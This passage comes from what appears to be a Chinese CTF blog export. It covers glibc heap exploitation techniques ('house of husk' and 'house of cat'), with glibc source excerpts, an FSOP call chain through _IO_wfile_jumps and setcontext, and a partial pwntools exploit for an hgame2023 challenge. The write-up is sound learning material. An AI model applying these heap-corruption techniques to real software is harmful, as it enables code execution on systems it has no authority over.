class="hljs-number">0</span>);<br>  va_end (arg);<br><br>  <span class="hljs-keyword">return</span> done;<br>&#125;<br></code></pre></td></tr></table></figure><p>__vfprintf_internal在有格式化字符串的情况下会进入判断，满足_printf_function_table !&#x3D; NULL会跳至do_positional执行printf_positional</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.36\stdio-common\vfprintf-internal.c</span><br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">vfprintf</span> <span class="hljs-params">(FILE *s, <span class="hljs-type">const</span> CHAR_T *format, va_list ap, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mode_flags)</span><br>&#123;<br><br>……<br><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="hljs-literal">NULL</span><br>|| __printf_modifier_table != <span class="hljs-literal">NULL</span><br>|| __printf_va_arg_table != <span class="hljs-literal">NULL</span>))<br>    <span class="hljs-keyword">goto</span> do_positional;<br><br>……<br><br>do_positional:<br>  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,<br>    done, nspecs_done, lead_str_end, work_buffer,<br>    save_errno, grouping, thousands_sep, mode_flags);<br><br> all_done:<br>  _IO_funlockfile (s);<br>  _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><br>  <span class="hljs-keyword">return</span> done;<br>&#125;<br></code></pre></td></tr></table></figure><p>printf_positional调用了__parse_one_specmb</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.36\stdio-common\vfprintf-internal.c</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span><br><span class="hljs-title function_">printf_positional</span> <span class="hljs-params">(FILE *s, <span class="hljs-type">const</span> CHAR_T *format, <span class="hljs-type">int</span> readonly_format,</span><br><span class="hljs-params">   va_list ap, va_list *ap_savep, <span class="hljs-type">int</span> done, <span class="hljs-type">int</span> nspecs_done,</span><br><span class="hljs-params">   <span class="hljs-type">const</span> UCHAR_T *lead_str_end,</span><br><span class="hljs-params">   CHAR_T *work_buffer, <span class="hljs-type">int</span> save_errno,</span><br><span class="hljs-params">   <span class="hljs-type">const</span> <span class="hljs-type">char</span> *grouping, THOUSANDS_SEP_T thousands_sep,</span><br><span class="hljs-params">   <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mode_flags)</span><br>&#123;<br><br>……<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> COMPILE_WPRINTF</span><br>      nargs += __parse_one_specwc (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>      nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>……<br></code></pre></td></tr></table></figure><p>进入__parse_one_specmb后如果不满足__printf_function_table &#x3D;&#x3D; NULL并且__printf_arginfo_table[spec-&gt;info.spec] &#x3D;&#x3D; NULL就会调用__printf_arginfo_table[spec-&gt;info.spec]函数，触发利用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span><br>attribute_hidden<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> COMPILE_WPRINTF</span><br>__parse_one_specwc (<span class="hljs-type">const</span> UCHAR_T *format, <span class="hljs-type">size_t</span> posn,<br>    <span class="hljs-keyword">struct</span> printf_spec *spec, <span class="hljs-type">size_t</span> *max_ref_arg)<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>__parse_one_specmb (<span class="hljs-type">const</span> UCHAR_T *format, <span class="hljs-type">size_t</span> posn,<br>    <span class="hljs-keyword">struct</span> printf_spec *spec, <span class="hljs-type">size_t</span> *max_ref_arg)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#123;<br><br>……<br><br>  <span class="hljs-keyword">if</span> (__builtin_expect (__printf_function_table == <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>)<br>      || spec-&gt;info.spec &gt; UCHAR_MAX<br>      || __printf_arginfo_table[spec-&gt;info.spec] == <span class="hljs-literal">NULL</span><br>      || (<span class="hljs-type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])<br>   (&amp;spec-&gt;info, <span class="hljs-number">1</span>, &amp;spec-&gt;data_arg_type,<br>    &amp;spec-&gt;size)) &lt; <span class="hljs-number">0</span>)<br><br>……<br></code></pre></td></tr></table></figure><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>我们可以利用unsorted bin attack或large bin attack改写global_max_fast为一个大值，这样所有释放的堆块都会放进fastbin中，我们只要计算好main_arena和__printf_arginfo_table以及__printf_function_table之间的偏移，释放相应大小的chunk，并且在__printf_arginfo_table的chunk中的__printf_arginfo_table[spec-&gt;info.spec]的位置写入one_gadget</p><img src="/2023/03/03/house-of-husk/distance.png" class title="distance">]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>IO</category>
      
    </categories>
    
    
    <tags>
      
      <tag>io</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>house of cat</title>
    <link href="/2023/02/24/house-of-cat/"/>
    <url>/2023/02/24/house-of-cat/</url>
    
    <content type="html"><![CDATA[<p>例题是hgame的week4，比赛的时候摆烂了，昨天学长提了所以补一下</p><span id="more"></span><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="高版本变化"><a href="#高版本变化" class="headerlink" title="高版本变化"></a>高版本变化</h2><h3 id="关于-IO-flush-all-lockp"><a href="#关于-IO-flush-all-lockp" class="headerlink" title="关于_IO_flush_all_lockp"></a>关于_IO_flush_all_lockp</h3><p>触发FSOP的途径有三个：</p><ul><li>程序执行exit</li><li>程序从main函数正常返回</li><li>触发malloc_printerr</li></ul><p>但是从2.27开始，abort函数不再执行fflush，第三种利用方式就不成立了</p><img src="/2023/02/24/house-of-cat/difference.png" class title="difference"><p>但还有一个assert可以利用<br>assert的宏定义如下，可见如果assert的表达式为假会执行__assert_fail</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.37\assert\assert.h</span><br><br><span class="hljs-meta"># <span class="hljs-keyword">if</span> defined __cplusplus</span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> assert(expr)\</span><br><span class="hljs-meta">     (static_cast <span class="hljs-string">&lt;bool&gt;</span> (expr)\</span><br><span class="hljs-meta">      ? void (0)\</span><br><span class="hljs-meta">      : __assert_fail (#expr, __FILE__, __LINE__, __ASSERT_FUNCTION))</span><br><span class="hljs-meta"># <span class="hljs-keyword">elif</span> !defined __GNUC__ || defined __STRICT_ANSI__</span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> assert(expr)\</span><br><span class="hljs-meta">    ((expr)\</span><br><span class="hljs-meta">     ? __ASSERT_VOID_CAST (0)\</span><br><span class="hljs-meta">     : __assert_fail (#expr, __FILE__, __LINE__, __ASSERT_FUNCTION))</span><br><span class="hljs-meta"># <span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> assert(expr)\</span><br><span class="hljs-meta">  ((void) sizeof ((expr) ? 1 : 0), __extension__ (&#123;\</span><br><span class="hljs-meta">      <span class="hljs-keyword">if</span> (expr)\</span><br><span class="hljs-meta">        ; <span class="hljs-comment">/* empty */</span>\</span><br><span class="hljs-meta">      <span class="hljs-keyword">else</span>\</span><br><span class="hljs-meta">        __assert_fail (#expr, __FILE__, __LINE__, __ASSERT_FUNCTION);\</span><br><span class="hljs-meta">    &#125;))</span><br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>malloc.c中有一个__assert_fail函数（2.36中删除了fflush，2.37删除了__malloc_assert函数）：</p><ul><li>2.35<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> NDEBUG</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> __assert_fail(assertion, file, <span class="hljs-keyword">line</span>, function)\</span><br><span class="hljs-meta"> __malloc_assert(assertion, file, <span class="hljs-keyword">line</span>, function)</span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__progname;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>__malloc_assert (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *assertion, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> line,<br> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *function)<br>&#123;<br>  (<span class="hljs-type">void</span>) __fxprintf (<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,<br>     __progname, __progname[<span class="hljs-number">0</span>] ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>     file, line,<br>     function ? function : <span class="hljs-string">&quot;&quot;</span>, function ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>     assertion);<br>  fflush (<span class="hljs-built_in">stderr</span>);<br>  <span class="hljs-built_in">abort</span> ();<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure></li><li>2.36用__libc_message替换了__fxprintf，且用__builtin_unreachable替换了fflush和abort，没有fflush assert的利用在2.36无法执行<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> NDEBUG</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> __assert_fail(assertion, file, <span class="hljs-keyword">line</span>, function)\</span><br><span class="hljs-meta"> __malloc_assert(assertion, file, <span class="hljs-keyword">line</span>, function)</span><br><br><span class="hljs-keyword">_Noreturn</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span><br>__malloc_assert (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *assertion, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> line,<br> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *function)<br>&#123;<br>  __libc_message (do_abort, <span class="hljs-string">&quot;\</span><br><span class="hljs-string">Fatal glibc error: malloc assertion failure in %s: %s\n&quot;</span>,<br>  function, assertion);<br>  __builtin_unreachable ();<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure></li><li>2.37虽然malloc.c中没有了__assert_fail函数，但assert.c中有__assert_fail函数，且也调用了fflush<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>__assert_fail (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *assertion, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> line,<br>       <span class="hljs-type">const</span> <span class="hljs-type">char</span> *function)<br>&#123;<br>  __assert_fail_base (_(<span class="hljs-string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n%n&quot;</span>),<br>      assertion, file, line, function);<br>&#125;<br><br><span class="hljs-type">void</span><br>__assert_fail_base (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fmt, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *assertion, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *file,<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> line, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *function)<br>&#123;<br>  <span class="hljs-type">char</span> *str;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> FATAL_PREPARE</span><br>  FATAL_PREPARE;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-type">int</span> total;<br>  <span class="hljs-keyword">if</span> (__asprintf (&amp;str, fmt,<br>  __progname, __progname[<span class="hljs-number">0</span>] ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>  file, line,<br>  function ? function : <span class="hljs-string">&quot;&quot;</span>, function ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>  assertion, &amp;total) &gt;= <span class="hljs-number">0</span>)<br>    &#123;<br>      (<span class="hljs-type">void</span>) __fxprintf (<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;%s&quot;</span>, str);<br>      (<span class="hljs-type">void</span>) fflush (<span class="hljs-built_in">stderr</span>);<br>……<br></code></pre></td></tr></table></figure></li></ul><p>综上，2.36无法使用assert触发漏洞，2.35以前和2.37可以<br>利用__malloc_assert中执行的fflush函数（不用在意stderr，之后这个参数就没有用了）触发漏洞<br>主要使用的触发assert的部分在sysmalloc中。在_int_malloc中，如果top chunk不够分配会调用sysmalloc，在sysmalloc中如果请求大小小于mp_.mmap_threshold（0x20000）会拓展top chunk，这里有一个assert</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="hljs-number">0</span>) ||<br>        ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;<br>         prev_inuse (old_top) &amp;&amp;<br>         ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) old_end &amp; (pagesize - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure><p>触发条件：</p><ul><li>top chunk大小小于MINSIZE（0x20）</li><li>pre_inuse位为0</li><li>top chunk没有页对齐</li></ul><h3 id="关于vtable"><a href="#关于vtable" class="headerlink" title="关于vtable"></a>关于vtable</h3><p>2.24增加了对vtable位置的检查，2.28又将常利用的相对地址引用替换成了malloc和free，堵死了这条调用链<br>看一眼跳转表的宏定义，发现只有JUMP跳转有vtable检查，而WJUMP没有</p><img src="/2023/02/24/house-of-cat/jump.png" class title="jump"><p>_IO_wfile_jumps结构体使用WJUMP，那么我们可以考虑伪造_IO_wfile_jumps的vtable，_IO_wfile_jumps结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.37\libio\wfileops.c</span><br><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_wfile_jumps</span> <span class="hljs-title">libio_vtable</span> =</span><br>&#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, _IO_new_file_finish),<br>  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),<br>  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),<br>  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),<br>  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),<br>  JUMP_INIT(xsputn, _IO_wfile_xsputn),<br>  JUMP_INIT(xsgetn, _IO_file_xsgetn),<br>  JUMP_INIT(seekoff, _IO_wfile_seekoff),<br>  JUMP_INIT(seekpos, _IO_default_seekpos),<br>  JUMP_INIT(setbuf, _IO_new_file_setbuf),<br>  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),<br>  JUMP_INIT(doallocate, _IO_wfile_doallocate),<br>  JUMP_INIT(read, _IO_file_read),<br>  JUMP_INIT(write, _IO_new_file_write),<br>  JUMP_INIT(seek, _IO_file_seek),<br>  JUMP_INIT(close, _IO_file_close),<br>  JUMP_INIT(stat, _IO_file_stat),<br>  JUMP_INIT(showmanyc, _IO_default_showmanyc),<br>  JUMP_INIT(imbue, _IO_default_imbue)<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p>_IO_wfile_jumps结构体中的_IO_wfile_seekoff源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.37\libio\wfileops.c</span><br><br><span class="hljs-type">off64_t</span><br>_IO_wfile_seekoff (FILE *fp, <span class="hljs-type">off64_t</span> offset, <span class="hljs-type">int</span> dir, <span class="hljs-type">int</span> mode)<br>&#123;<br>  <span class="hljs-type">off64_t</span> result;<br>  <span class="hljs-type">off64_t</span> delta, new_offset;<br>  <span class="hljs-type">long</span> <span class="hljs-type">int</span> count;<br><br>  <span class="hljs-keyword">if</span> (mode == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> do_ftell_wide (fp);<br><br>  <span class="hljs-type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base<br>== fp-&gt;_wide_data-&gt;_IO_read_end)<br>       &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base<br>   == fp-&gt;_wide_data-&gt;_IO_write_ptr));<br><br>  <span class="hljs-type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr<br>       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)<br>      || _IO_in_put_mode (fp));<br><br>  <span class="hljs-keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))<br>    <span class="hljs-keyword">return</span> WEOF;<br>……<br></code></pre></td></tr></table></figure><p>要调用_IO_switch_to_wget_mode必须要通过was_writing的检查，即fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base<br>_IO_switch_to_wget_mode源码如下，_IO_WOVERFLOW是通过跳转表调用的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.37\libio\wgenops.c</span><br><br><span class="hljs-type">int</span><br>_IO_switch_to_wget_mode (FILE *fp)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)<br>      <span class="hljs-keyword">return</span> EOF;<br>……<br></code></pre></td></tr></table></figure><p>再看看_IO_switch_to_wget_mode的汇编代码：</p><img src="/2023/02/24/house-of-cat/switch.png" class title="switch"><p>我们可以通过rdi控制rdx和rax，在有沙箱的情况下调用setcontext<br>具体利用过程见例题   </p><h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">__malloc_assert(<span class="hljs-built_in">exit</span>)-&gt;_IO_flush_all_lockp(fflush)-&gt;_IO_wfile_seekoff-&gt;_IO_switch_to_wget_mode-&gt;setcontext(system)<br></code></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="hgame2023-week4-without-hook"><a href="#hgame2023-week4-without-hook" class="headerlink" title="hgame2023 week4 without hook"></a>hgame2023 week4 without hook</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>uaf不解释了，直接开始<br>泄露libc和堆地址就不说了，large bin attack将堆地址写入_IO_list_all然后调用exit正常退出<br>接下来就是疯狂调试伪造_IO_FILE_plus结构体，步骤如下：</p><ul><li>fp-&gt;_mode&lt;&#x3D;0，fp-&gt;_IO_write_ptr&gt;fp-&gt;_IO_write_base</li><li>vtable指向_IO_wfile_jumps+48（利用偏移使_IO_flush_all_lockp调用_IO_OVERFLOW实际进入_IO_wfile_seekoff</li><li>函数进入_IO_switch_to_wget_mode，要求伪造fp-&gt;_wide_data<img src="/2023/02/24/house-of-cat/IO_FILE_plus.png" class title="IO_FILE_plus"></li><li>伪造_IO_wide_data结构体，_wide_data-&gt;_IO_write_ptr&gt;_wide_data-&gt;_IO_write_base</li><li>伪造vtable指向堆地址，利用_IO_WOVERFLOW指向setcontext+53<img src="/2023/02/24/house-of-cat/IO_wide_data.png" class title="IO_wide_data"></li><li>寄存器布置边调试边改就行</li></ul><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content: &#x27;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br>p=process(<span class="hljs-string">&#x27;./hook&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-comment">#large bin attack change _IO_list_all</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x550</span>)<span class="hljs-comment">#p1</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>)<span class="hljs-comment">#pad</span><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x540</span>)<span class="hljs-comment">#p2</span><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x500</span>)<span class="hljs-comment">#pad</span><br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libcbase=u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span 